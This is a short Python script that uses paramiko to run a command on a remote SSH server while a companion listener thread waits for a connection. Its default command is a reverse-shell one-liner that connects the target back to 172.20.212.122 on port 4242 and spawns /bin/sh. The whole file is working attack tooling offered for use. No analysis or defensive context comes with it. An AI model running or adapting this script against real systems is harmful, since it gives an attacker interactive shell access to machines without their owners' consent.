import paramiko
from multiprocessing import Process
import os
import getpass
from threading import Thread
from RevShListener import listener

def ssh_command(ip,port,user,passwd,cmd):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,port=port,username=user,password=passwd)
    _,stdout,stderr=client.exec_command(cmd)
    output=stdout.readlines() + stderr.readlines()
    if output:
        print("---Output---")
        for line in output:
            print(line.strip())

def SSH_setup():
    user=input("Username: ")
    password=getpass.getpass()
    ip=input("Enter server IP: ")
    port=input("Enter port:") or "22"
    cmd=input("enter command:") or "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.20.212.122\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
    ssh_command(ip,port,user,password,cmd)

if __name__=="__main__":
    p="4242"
    l=Thread(target=listener)
    ssh=Thread(target=SSH_setup)
    l.start()
    ssh.start()